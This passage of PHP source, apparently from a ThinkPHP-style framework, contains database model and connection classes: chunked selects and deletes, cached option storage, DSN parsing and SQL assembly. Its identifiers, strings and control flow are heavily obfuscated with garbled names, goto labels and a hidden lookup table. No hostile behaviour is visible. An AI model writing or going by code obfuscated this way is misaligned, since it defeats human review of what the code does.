$e…Îã±Æ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aî¶ÎŠ¡îê = self::SQL_WHERE_IN_CHUNK; $C—Ğ•›ˆŸ = $this->optionsValue(); goto FÕÛÃ—§Ÿˆ; FÕÛÃ—§Ÿˆ: $eŒ„—×ô¼Æ = $this->findWhereField($C—Ğ•›ˆŸ); if (!$eŒ„—×ô¼Æ || isset($C—Ğ•›ˆŸ[$e…Îã±Æ[295]]) || isset($C—Ğ•›ˆŸ[$e…Îã±Æ[356]])) { return parent::select($fâêŞØòø×); } $aâ´äµ´œ = $C—Ğ•›ˆŸ[$e…Îã±Æ[278]][$eŒ„—×ô¼Æ][1]; goto c©‰˜…ğŞ; c©‰˜…ğŞ: $aâ´äµ´œ = is_array($aâ´äµ´œ) ? $aâ´äµ´œ : array(); $eô‘©‰† = null; for ($BÉ †¹Ùùª = 0; $BÉ †¹Ùùª < count($aâ´äµ´œ); $BÉ †¹Ùùª += $aî¶ÎŠ¡îê) { $AØ°©—»… = array_slice($aâ´äµ´œ, $BÉ †¹Ùùª, $aî¶ÎŠ¡îê); if (!is_array($AØ°©—»…) || count($AØ°©—»…) == 0) { break; } $C—Ğ•›ˆŸ[$e…Îã±Æ[278]][$eŒ„—×ô¼Æ][1] = $AØ°©—»…; $this->optionsValue($C—Ğ•›ˆŸ); $dÌÔ¶†ÊÀ  = parent::select($fâêŞØòø×); if (!$dÌÔ¶†ÊÀ ) { continue; } if (is_null($eô‘©‰†)) { $eô‘©‰† = array(); } $eô‘©‰† = array_merge($eô‘©‰†, $dÌÔ¶†ÊÀ ); } goto f·ˆğŠİ; CùÄƒ¦İÛÇ: } public function delete($fñÍ‚ „º™ = array()) { goto B“™ôŸªÌŸ; D­ŠíÂ‘ø©: return $BÓé¿¸ºß; goto C½±¯†ŸÚ‚; B“™ôŸªÌŸ: $bğğ‹â«’ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Eé¨°®ö¯  = self::SQL_WHERE_IN_CHUNK; $BÖÃ…½ÇÑ = $this->optionsValue(); goto aÄªùµá©Š; aÄªùµá©Š: $d³Ãˆ×ÑÚø = $this->findWhereField($BÖÃ…½ÇÑ); if (!$d³Ãˆ×ÑÚø) { return parent::delete($fñÍ‚ „º™); } $BÓé¿¸ºß = 0; goto CŞâ”³°“­; CŞâ”³°“­: $cí„¡ºÅîã = $BÖÃ…½ÇÑ[$bğğ‹â«’[278]][$d³Ãˆ×ÑÚø][1]; $cí„¡ºÅîã = is_array($cí„¡ºÅîã) ? $cí„¡ºÅîã : array(); for ($fç­ƒ±®‡” = 0; $fç­ƒ±®‡” < count($cí„¡ºÅîã); $fç­ƒ±®‡” += $Eé¨°®ö¯ ) { $b‹¾—·£†† = array_slice($cí„¡ºÅîã, $fç­ƒ±®‡”, $Eé¨°®ö¯ ); if (!is_array($b‹¾—·£††) || count($b‹¾—·£††) == 0) { break; } $BÖÃ…½ÇÑ[$bğğ‹â«’[278]][$d³Ãˆ×ÑÚø][1] = $b‹¾—·£††; $this->optionsValue($BÖÃ…½ÇÑ); $BÓé¿¸ºß += parent::delete($fñÍ‚ „º™); } goto D­ŠíÂ‘ø©; C½±¯†ŸÚ‚: } private function findWhereField($FÍİÇø…æ÷) { $bñô˜–Ş¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fæ¸ÈÖ“¥ = self::SQL_WHERE_IN_CHUNK; if (!is_array($FÍİÇø…æ÷) || !is_array($FÍİÇø…æ÷[$bñô˜–Ş¶[278]])) { return !1; } foreach ($FÍİÇø…æ÷[$bñô˜–Ş¶[278]] as $Eî´ª½¿›® => $DåÛ¨¥å§ó) { if (is_array($DåÛ¨¥å§ó) && isset($DåÛ¨¥å§ó[0]) && is_string($DåÛ¨¥å§ó[0]) && strtolower($DåÛ¨¥å§ó[0]) == $bñô˜–Ş¶[7] && is_array($DåÛ¨¥å§ó[1]) && count($DåÛ¨¥å§ó[1]) > $fæ¸ÈÖ“¥) { ignore_timeout(); return $Eî´ª½¿›®; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\x74\145\155\x4f\160\164\151\x6f\156"; public $field = array(); public function listData($b«­Ü£ØÎ = false, $EÑ­ÂÃÃÁÒ = "\155\157\x64\151\146\x79\124\151\x6d\145", $AÑø¦£Ş­Ş = false) { $B†§½¡´¥İ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$B†§½¡´¥İ) { return $b«­Ü£ØÎ ? null : array(); } if (!$b«­Ü£ØÎ) { $B†§½¡´¥İ = array_filter(array_values($B†§½¡´¥İ)); return array_sort_by($B†§½¡´¥İ, $EÑ­ÂÃÃÁÒ, $AÑø¦£Ş­Ş); } return $B†§½¡´¥İ[$_SERVER[åÌÛ»ô¢‚ö™][389] . $b«­Ü£ØÎ]; } public function insert($BœÁÏÊŞ˜Ò) { goto aè„†Â‚Ğ; aè„†Â‚Ğ: $d¯Î®â×ê =& $_SERVER[åÌÛ»ô¢‚ö™]; $BœÁÏÊŞ˜Ò = array_field_key($BœÁÏÊŞ˜Ò, $this->field); $C¦¹­¦ã¤½ = Model($this->modelType)->get($d¯Î®â×ê[390], $this->optionType . $d¯Î®â×ê[391]); goto Açø†ƒç÷; Açø†ƒç÷: $C¦¹­¦ã¤½ = $C¦¹­¦ã¤½ ? $C¦¹­¦ã¤½ : 0; $BœÁÏÊŞ˜Ò[$d¯Î®â×ê[392]] = ++$C¦¹­¦ã¤½; $BœÁÏÊŞ˜Ò[$d¯Î®â×ê[200]] = time(); goto fæšÖ‚ôø; fæšÖ‚ôø: $BœÁÏÊŞ˜Ò[$d¯Î®â×ê[107]] = time(); Model($this->modelType)->set($d¯Î®â×ê[390], $C¦¹­¦ã¤½, $this->optionType . $d¯Î®â×ê[391]); Model($this->modelType)->set($d¯Î®â×ê[389] . $C¦¹­¦ã¤½, $BœÁÏÊŞ˜Ò, $this->optionType); goto f¼¹ÀÎ†îÒ; f¼¹ÀÎ†îÒ: return $C¦¹­¦ã¤½; goto BÅ ù½éÌ; BÅ ù½éÌ: } public function update($DÌææØ·Äà, $f•­ã…¶ É) { goto A¼‰òÉÔĞ; Fš¬ª¬‘å: return Model($this->modelType)->set($f„ìÑÓË [389] . $DÌææØ·Äà, $f•­ã…¶ É, $this->optionType); goto fß¡ñ¢›‹¯; A¼‰òÉÔĞ: $f„ìÑÓË  =& $_SERVER[åÌÛ»ô¢‚ö™]; $f•­ã…¶ É = array_field_key($f•­ã…¶ É, $this->field); $aŒÍ‹˜ßŸ£ = $this->listData($DÌææØ·Äà); goto a™·ÊÅ£…À; a™·ÊÅ£…À: if (!$aŒÍ‹˜ßŸ£) { return !1; } $f•­ã…¶ É = array_merge($aŒÍ‹˜ßŸ£, $f•­ã…¶ É); $f•­ã…¶ É[$f„ìÑÓË [107]] = time(); goto Fš¬ª¬‘å; fß¡ñ¢›‹¯: } public function remove($EĞ«ëŠŸµ‡) { return Model($this->modelType)->remove($_SERVER[åÌÛ»ô¢‚ö™][389] . $EĞ«ëŠŸµ‡, $this->optionType); } public function clear() { $eºÆÖ¶¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; Model($this->modelType)->remove($eºÆÖ¶¦[390], $this->optionType . $eºÆÖ¶¦[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($B ÈŠ‘¸ç, $FÕåë •à®) { if (!$FÕåë •à®) { return !1; } $f”àôŞ¯Æ† = $this->listData(); $f”àôŞ¯Æ† = array_to_keyvalue($f”àôŞ¯Æ†, $B ÈŠ‘¸ç); return isset($f”àôŞ¯Æ†[$FÕåë •à®]) ? $f”àôŞ¯Æ†[$FÕåë •à®] : !1; } public function findByName($eƒëÆ¼òİ™) { return $this->findByKey($_SERVER[åÌÛ»ô¢‚ö™][28], $eƒëÆ¼òİ™); } protected function resetData($D¼ÂÂ‹åÁ¯) { $D´—¢°ÍÄ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D¼ÂÂ‹åÁ¯ = is_array($D¼ÂÂ‹åÁ¯) ? $D¼ÂÂ‹åÁ¯ : array(); $dÂİ‰¶¢èÄ = array(); for ($b¤Œ«Õ¡–¥ = 0; $b¤Œ«Õ¡–¥ < count($D¼ÂÂ‹åÁ¯); $b¤Œ«Õ¡–¥++) { $dÂİ‰¶¢èÄ[$D´—¢°ÍÄ[389] . $D¼ÂÂ‹åÁ¯[$b¤Œ«Õ¡–¥][$D´—¢°ÍÄ[392]]] = $D¼ÂÂ‹åÁ¯[$b¤Œ«Õ¡–¥]; } return Model($this->modelType)->set($dÂİ‰¶¢èÄ, !1, $this->optionType); } private function getAutoName($Fß‡ ¶³‰) { $dê™•­Ë§œ = array_to_keyvalue($this->listData(), $_SERVER[åÌÛ»ô¢‚ö™][28]); if (!$dê™•­Ë§œ || !isset($dê™•­Ë§œ[$Fß‡ ¶³‰])) { return $Fß‡ ¶³‰; } for ($Cè …õÎ›Â = 1; $Cè …õÎ›Â < count($dê™•­Ë§œ); $Cè …õÎ›Â++) { $cÊ…Ï•«ù = $Fß‡ ¶³‰ . "\50{$Cè …õÎ›Â}\x29"; if (!isset($dê™•­Ë§œ[$cÊ…Ï•«ù])) { return $cÊ…Ï•«ù; } } return $cÊ…Ï•«ù; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($f†ÍëªíŒ = false, $cöË…ŠƒÅ­ = '', $Fõ¤ÚÖ¨ôÑ = false) { goto dëÎºÌÛó³; dëÎºÌÛó³: $Cëˆ¿äØÊô =& $_SERVER[åÌÛ»ô¢‚ö™]; $cß­óÉÎĞ = $this->cacheGet($cöË…ŠƒÅ­); $dÁ¢èäƒ = $this->optionDefault($cöË…ŠƒÅ­); goto DãŒØÆ‡äÏ; BÜ·âŒÖÂ: $this->cacheSet($cöË…ŠƒÅ­, $cß­óÉÎĞ); $cß­óÉÎĞ = array_merge($dÁ¢èäƒ, $cß­óÉÎĞ); return $f†ÍëªíŒ ? $cß­óÉÎĞ[$f†ÍëªíŒ] : $cß­óÉÎĞ; goto D‰å¯àã‹²; DãŒØÆ‡äÏ: $dÁ¢èäƒ = is_array($dÁ¢èäƒ) ? $dÁ¢èäƒ : array(); if (is_array($cß­óÉÎĞ)) { $cß­óÉÎĞ = array_merge($dÁ¢èäƒ, $cß­óÉÎĞ); return $f†ÍëªíŒ ? isset($cß­óÉÎĞ[$f†ÍëªíŒ]) ? $cß­óÉÎĞ[$f†ÍëªíŒ] : null : $cß­óÉÎĞ; } $a»¸ØŸ‹Š‚ = $this->filterWhere(array($Cëˆ¿äØÊô[29] => $cöË…ŠƒÅ­)); goto Aí”Ê×É‘¸; Aí”Ê×É‘¸: $cß­óÉÎĞ = $this->where($a»¸ØŸ‹Š‚)->select(); $cß­óÉÎĞ = array_to_keyvalue($cß­óÉÎĞ, $Cëˆ¿äØÊô[89], $Cëˆ¿äØÊô[375]); foreach ($cß­óÉÎĞ as $DÎ½çº’ãØ => $f™ÌÕ‰ÇÌ) { if ($Fõ¤ÚÖ¨ôÑ || in_array($DÎ½çº’ãØ, $this->jsonField)) { $cß­óÉÎĞ[$DÎ½çº’ãØ] = json_decode($f™ÌÕ‰ÇÌ, !0); } } goto BÜ·âŒÖÂ; D‰å¯àã‹²: } public function set($D£¬÷ÔÇ°Á, $eÅ‹ÂÕïÈë = false, $B¹ÂáÎèŒ† = '') { goto f¾›ÎµŠ; DÓ½£Úƒ„³: return $this->addAll($eã¦¥„¯ƒÛ, array(), !0); goto dã‡íõÕÌï; aØ”ƒÒØ¬: $D§â¢â¡Õ» = is_array($D£¬÷ÔÇ°Á) ? $D£¬÷ÔÇ°Á : array($D£¬÷ÔÇ°Á => $eÅ‹ÂÕïÈë); foreach ($D§â¢â¡Õ» as $eÅ´™ä–Í => $f…İª”÷İ) { if (is_array($f…İª”÷İ)) { $f…İª”÷İ = json_encode_force($f…İª”÷İ); } $this->checkLength($f…İª”÷İ, !1, $this->tableName . $f¸¯‰ìéç[4] . $D£¬÷ÔÇ°Á); $f…İª”÷İ = self::textEncode($f…İª”÷İ); $D§â¢â¡Õ» = array($f¸¯‰ìéç[29] => $B¹ÂáÎèŒ†, $f¸¯‰ìéç[89] => $eÅ´™ä–Í, $f¸¯‰ìéç[375] => $f…İª”÷İ); $eã¦¥„¯ƒÛ[] = $this->filterWhere($D§â¢â¡Õ»); } if (!$eã¦¥„¯ƒÛ) { return !0; } goto DÓ½£Úƒ„³; f¾›ÎµŠ: $f¸¯‰ìéç =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->cacheRemove($B¹ÂáÎèŒ†); $eã¦¥„¯ƒÛ = array(); goto aØ”ƒÒØ¬; dã‡íõÕÌï: } protected function optionDefault($dæÓŒßƒ¤Ğ = '') { return !1; } public function setDeep($f°Æ£Èœ›Ö, $Fñ†Äˆ„î÷ = false, $FìÆïËÁò­ = '') { $aŠÄ¦ÄôÉ® = explode($_SERVER[åÌÛ»ô¢‚ö™][91], $f°Æ£Èœ›Ö); $fÏ…ƒ…½ÂÜ = $this->get(); array_set_value($fÏ…ƒ…½ÂÜ, $f°Æ£Èœ›Ö, $Fñ†Äˆ„î÷); $this->set($aŠÄ¦ÄôÉ®[0], $fÏ…ƒ…½ÂÜ[$aŠÄ¦ÄôÉ®[0]], $FìÆïËÁò­); } public function remove($BàåÓšéï, $BŞ¤—¬®¢“ = '') { $D ’Íº“œ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->cacheRemove($BŞ¤—¬®¢“); $BôÎ·ª§á = $this->filterWhere(array($D ’Íº“œ[89] => $BàåÓšéï, $D ’Íº“œ[29] => $BŞ¤—¬®¢“)); if (is_null($BàåÓšéï)) { unset($BôÎ·ª§á[$D ’Íº“œ[89]]); } return $this->where($BôÎ·ª§á)->delete(); } public function cacheSet($béÅŒ‘ì, $b¾±ŸœñØ = false) { return Cache::set($this->cacheKey($béÅŒ‘ì), $b¾±ŸœñØ); } public function cacheGet($Fì¨ìğƒ) { return Cache::get($this->cacheKey($Fì¨ìğƒ)); } public function cacheRemove($c…ººÌßçè) { return Cache::remove($this->cacheKey($c…ººÌßçè)); } protected function filterWhere($b×ÕÈ±Ç“†) { return $b×ÕÈ±Ç“†; } protected function cacheKey($EÄ¢ÕÈ†›) { return $EÄ¢ÕÈ†›; } } goto f”È—ÉÂ—; béÌÊÌç£: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\145\161" => "\74\x3e", "\x67\164" => "\x3e", "\145\x67\x74" => "\76\x3d", "\x6c\164" => "\74", "\x65\x6c\x74" => "\x3c\75", "\x6e\x6f\x74\154\x69\153\145" => "\116\x4f\124\40\x4c\x49\x4b\105", "\154\151\153\x65" => "\114\x49\x4b\x45", "\x69\156" => "\111\x4e", "\156\x6f\x74\x69\x6e" => "\x4e\117\124\40\x49\x4e", "\156\x6f\164\40\151\x6e" => "\x4e\x4f\x54\40\x49\116", "\x62\145\164\x77\145\x65\x6e" => "\102\x45\x54\x57\105\x45\x4e", "\156\157\x74\142\145\164\167\x65\145\156" => "\116\x4f\x54\x20\x42\x45\124\127\x45\105\x4e", "\156\x6f\x74\x20\142\145\164\167\145\145\x6e" => "\x4e\117\124\x20\x42\105\x54\127\x45\x45\x4e"); protected $selectSql = "\123\105\x4c\105\103\x54\45\104\x49\123\x54\x49\x4e\x43\x54\45\x20\45\106\x49\x45\114\x44\45\40\106\122\x4f\x4d\40\x25\124\x41\x42\114\105\45\x25\x4a\x4f\x49\x4e\45\x25\127\x48\x45\x52\105\45\45\x47\x52\117\x55\120\x25\45\110\x41\x56\111\x4e\107\x25\45\x4f\122\104\x45\x52\x25\x25\x4c\x49\x4d\111\124\x25\40\45\x55\116\x49\x4f\x4e\45\x25\x43\x4f\x4d\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $Dâµ‘Á¡Õó = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[åÌÛ»ô¢‚ö™][897], $Dâµ‘Á¡Õó); } public function factory($D‘ÖêƒÕÇ¯ = '') { goto BëÒÍéÒå‹; BëÒÍéÒå‹: $A«²£ ÄÏ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D‘ÖêƒÕÇ¯ = $this->parseConfig($D‘ÖêƒÕÇ¯); if (empty($D‘ÖêƒÕÇ¯[$A«²£ ÄÏ[898]])) { think_exception(think_lang($A«²£ ÄÏ[899])); } goto eø¬ÆÊ«ã‘; fŸ‹„Õ÷›Å: return $EØğª¾Šİ²; goto D‘ÁôáœÎ; eø¬ÆÊ«ã‘: $this->dbType = ucwords(strtolower($D‘ÖêƒÕÇ¯[$A«²£ ÄÏ[898]])); $B‡ŒÙä¿ = $A«²£ ÄÏ[900] . $this->dbType; if (class_exists($B‡ŒÙä¿)) { $EØğª¾Šİ² = new $B‡ŒÙä¿($D‘ÖêƒÕÇ¯); if ($A«²£ ÄÏ[750] != strtolower($D‘ÖêƒÕÇ¯[$A«²£ ÄÏ[898]])) { $EØğª¾Šİ²->dbType = strtoupper($this->dbType); } else { $EØğª¾Šİ²->dbType = $this->_getDsnType($D‘ÖêƒÕÇ¯[$A«²£ ÄÏ[853]]); } } else { think_exception(think_lang($A«²£ ÄÏ[901]) . $A«²£ ÄÏ[902] . $B‡ŒÙä¿); } goto fŸ‹„Õ÷›Å; D‘ÁôáœÎ: } public function __call($fŸ£’·’«, $bÈøÏ½«’) { if (method_exists($this, $fŸ£’·’«)) { return call_user_func_array(array($this, $fŸ£’·’«), $bÈøÏ½«’); } } protected function _getDsnType($aˆé¹øç“) { $fì™ÓÅÏöÈ = explode($_SERVER[åÌÛ»ô¢‚ö™][4], $aˆé¹øç“); $dî§èõèÔµ = strtoupper(trim($fì™ÓÅÏöÈ[0])); return $dî§èõèÔµ; } private function parseConfig($e¿¥ãˆŠÙô = '') { $b˜Âå§Š  =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!empty($e¿¥ãˆŠÙô) && is_string($e¿¥ãˆŠÙô)) { $e¿¥ãˆŠÙô = $this->parseDSN($e¿¥ãˆŠÙô); } elseif (is_array($e¿¥ãˆŠÙô)) { $e¿¥ãˆŠÙô = array_change_key_case($e¿¥ãˆŠÙô); $e¿¥ãˆŠÙô = array($b˜Âå§Š [898] => $e¿¥ãˆŠÙô[$b˜Âå§Š [749]], $b˜Âå§Š [826] => $e¿¥ãˆŠÙô[$b˜Âå§Š [903]], $b˜Âå§Š [827] => $e¿¥ãˆŠÙô[$b˜Âå§Š [904]], $b˜Âå§Š [824] => $e¿¥ãˆŠÙô[$b˜Âå§Š [905]], $b˜Âå§Š [825] => $e¿¥ãˆŠÙô[$b˜Âå§Š [906]], $b˜Âå§Š [17] => $e¿¥ãˆŠÙô[$b˜Âå§Š [907]], $b˜Âå§Š [853] => $e¿¥ãˆŠÙô[$b˜Âå§Š [751]], $b˜Âå§Š [13] => isset($e¿¥ãˆŠÙô[$b˜Âå§Š [908]]) ? $e¿¥ãˆŠÙô[$b˜Âå§Š [908]] : array()); } elseif (empty($e¿¥ãˆŠÙô)) { if (think_config($b˜Âå§Š [909]) && $b˜Âå§Š [750] != strtolower(think_config($b˜Âå§Š [910]))) { $e¿¥ãˆŠÙô = $this->parseDSN(think_config($b˜Âå§Š [909])); } else { $e¿¥ãˆŠÙô = array($b˜Âå§Š [898] => think_config($b˜Âå§Š [910]), $b˜Âå§Š [826] => think_config($b˜Âå§Š [911]), $b˜Âå§Š [827] => think_config($b˜Âå§Š [912]), $b˜Âå§Š [824] => think_config($b˜Âå§Š [913]), $b˜Âå§Š [825] => think_config($b˜Âå§Š [914]), $b˜Âå§Š [17] => think_config($b˜Âå§Š [249]), $b˜Âå§Š [853] => think_config($b˜Âå§Š [909]), $b˜Âå§Š [13] => think_config($b˜Âå§Š [915])); } } return $e¿¥ãˆŠÙô; } protected function initConnect($C˜ö™§ÔñÇ = true) { if (1 == think_config($_SERVER[åÌÛ»ô¢‚ö™][18])) { $this->_linkID = $this->multiConnect($C˜ö™§ÔñÇ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Aâå‚ëêÆÊ => $D‹®™Ùî²•) { $this->_linkID = $D‹®™Ùî²•; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($bæØ„Õôº = false) { $F¤ÒŸ§ÜøÊ =& $_SERVER[åÌÛ»ô¢‚ö™]; static $eŞ±Ğ‘Ş« = array(); if (empty($eŞ±Ğ‘Ş«)) { foreach ($this->config as $F÷¼ÈÁâÔä => $cÉ ²ò¼ß) { $eŞ±Ğ‘Ş«[$F÷¼ÈÁâÔä] = explode($F¤ÒŸ§ÜøÊ[47], $cÉ ²ò¼ß); } } if (think_config($F¤ÒŸ§ÜøÊ[916])) { if ($bæØ„Õôº) { $CõÑÈƒÃÅé = floor(mt_rand(0, think_config($F¤ÒŸ§ÜøÊ[917]) - 1)); } else { if (is_numeric(think_config($F¤ÒŸ§ÜøÊ[918]))) { $CõÑÈƒÃÅé = think_config($F¤ÒŸ§ÜøÊ[918]); } else { $CõÑÈƒÃÅé = floor(mt_rand(think_config($F¤ÒŸ§ÜøÊ[917]), count($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[824]]) - 1)); } } } else { $CõÑÈƒÃÅé = floor(mt_rand(0, count($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[824]]) - 1)); } $B†‹è®éÆ… = array($F¤ÒŸ§ÜøÊ[826] => isset($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[826]][$CõÑÈƒÃÅé]) ? $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[826]][$CõÑÈƒÃÅé] : $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[826]][0], $F¤ÒŸ§ÜøÊ[827] => isset($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[827]][$CõÑÈƒÃÅé]) ? $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[827]][$CõÑÈƒÃÅé] : $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[827]][0], $F¤ÒŸ§ÜøÊ[824] => isset($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[824]][$CõÑÈƒÃÅé]) ? $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[824]][$CõÑÈƒÃÅé] : $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[824]][0], $F¤ÒŸ§ÜøÊ[825] => isset($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[825]][$CõÑÈƒÃÅé]) ? $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[825]][$CõÑÈƒÃÅé] : $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[825]][0], $F¤ÒŸ§ÜøÊ[17] => isset($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[17]][$CõÑÈƒÃÅé]) ? $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[17]][$CõÑÈƒÃÅé] : $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[17]][0], $F¤ÒŸ§ÜøÊ[853] => isset($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[853]][$CõÑÈƒÃÅé]) ? $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[853]][$CõÑÈƒÃÅé] : $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[853]][0], $F¤ÒŸ§ÜøÊ[13] => isset($eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[13]][$CõÑÈƒÃÅé]) ? $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[13]][$CõÑÈƒÃÅé] : $eŞ±Ğ‘Ş«[$F¤ÒŸ§ÜøÊ[13]][0]); return $this->connect($B†‹è®éÆ…, $CõÑÈƒÃÅé); } public function parseDSN($e‚­Ö»Œá™) { $DŠ…‚‘ĞÔ‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($e‚­Ö»Œá™)) { return !1; } $FŒ¨ÌÜå•  = parse_url($e‚­Ö»Œá™); if ($FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[172]]) { $Eˆœ›í¶ä¶ = array($DŠ…‚‘ĞÔ‰[898] => $FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[172]], $DŠ…‚‘ĞÔ‰[826] => isset($FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[560]]) ? $FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[560]] : $DŠ…‚‘ĞÔ‰[33], $DŠ…‚‘ĞÔ‰[827] => isset($FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[919]]) ? $FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[919]] : $DŠ…‚‘ĞÔ‰[33], $DŠ…‚‘ĞÔ‰[824] => isset($FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[173]]) ? $FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[173]] : $DŠ…‚‘ĞÔ‰[33], $DŠ…‚‘ĞÔ‰[825] => isset($FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[174]]) ? $FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[174]] : $DŠ…‚‘ĞÔ‰[33], $DŠ…‚‘ĞÔ‰[17] => isset($FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[75]]) ? substr($FŒ¨ÌÜå• [$DŠ…‚‘ĞÔ‰[75]], 1) : $DŠ…‚‘ĞÔ‰[33]); } else { preg_match($DŠ…‚‘ĞÔ‰[920], trim($e‚­Ö»Œá™), $b“ì¢¶áŠÆ); $Eˆœ›í¶ä¶ = array($DŠ…‚‘ĞÔ‰[898] => $b“ì¢¶áŠÆ[1], $DŠ…‚‘ĞÔ‰[826] => $b“ì¢¶áŠÆ[2], $DŠ…‚‘ĞÔ‰[827] => $b“ì¢¶áŠÆ[3], $DŠ…‚‘ĞÔ‰[824] => $b“ì¢¶áŠÆ[4], $DŠ…‚‘ĞÔ‰[825] => $b“ì¢¶áŠÆ[5], $DŠ…‚‘ĞÔ‰[17] => $b“ì¢¶áŠÆ[6]); } $Eˆœ›í¶ä¶[$DŠ…‚‘ĞÔ‰[853]] = $DŠ…‚‘ĞÔ‰[33]; return $Eˆœ›í¶ä¶; } protected function debug() { $bíÓÊìºÆ =& $_SERVER[åÌÛ»ô¢‚ö™]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bíÓÊìºÆ[921]; if (think_config($bíÓÊìºÆ[922])) { think_status($bíÓÊìºÆ[923]); think_trace($this->queryStr . $bíÓÊìºÆ[924] . think_status($bíÓÊìºÆ[20], $bíÓÊìºÆ[923], 6) . $bíÓÊìºÆ[925], $bíÓÊìºÆ[33], $bíÓÊìºÆ[926]); } } protected function parseLock($CÛè¾‘‰ßÖ = false) { $d¢Õİäè„Ê =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$CÛè¾‘‰ßÖ) { return $d¢Õİäè„Ê[33]; } if ($d¢Õİäè„Ê[855] == $this->dbType) { return $d¢Õİäè„Ê[927]; } return $d¢Õİäè„Ê[928]; } protected function parseSet($cÓ£™£‡“) { $e½Ô·šÒÈƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($cÓ£™£‡“ as $c„Ù½ËÓÖİ => $D„±èÅİš) { if (is_array($D„±èÅİš) && $e½Ô·šÒÈƒ[300] == $D„±èÅİš[0]) { $EĞ×Ù‹ß«[] = $this->parseKey($c„Ù½ËÓÖİ) . $e½Ô·šÒÈƒ[929] . $D„±èÅİš[1]; } elseif (is_scalar($D„±èÅİš) || is_null($D„±èÅİš)) { $EĞ×Ù‹ß«[] = $this->parseKey($c„Ù½ËÓÖİ) . $e½Ô·šÒÈƒ[929] . $this->parseValue($D„±èÅİš); } } return $e½Ô·šÒÈƒ[930] . implode($e½Ô·šÒÈƒ[47], $EĞ×Ù‹ß«); } protected function bindParam($a—¶öÎô¨, $e‡“Úñø·³) { $this->bind[$_SERVER[åÌÛ»ô¢‚ö™][4] . $a—¶öÎô¨] = $e‡“Úñø·³; } protected function parseBind($BÈƒÈƒ») { $BÈƒÈƒ» = array_merge($this->bind, $BÈƒÈƒ»); $this->bind = array(); return $BÈƒÈƒ»; } function parseKey(&$Dƒ¶µŸ¬À…, $e‰ßâ¼¸ = true) { if ($e‰ßâ¼¸) { $Dƒ¶µŸ¬À… = $this->parseKeyCheck($Dƒ¶µŸ¬À…); } return $Dƒ¶µŸ¬À…; } function parseKeyCheck($D‰³•²Áô‹) { $A½±˜ÍàŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D‰³•²Áô‹ = trim($D‰³•²Áô‹); if (!preg_match($A½±˜ÍàŒ[931], $D‰³•²Áô‹)) { think_exception($A½±˜ÍàŒ[932] . $D‰³•²Áô‹); } return $D‰³•²Áô‹; } protected function parseValue($e¢ãºåÑİÕ) { $Eãòã‹ö† =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_string($e¢ãºåÑİÕ)) { 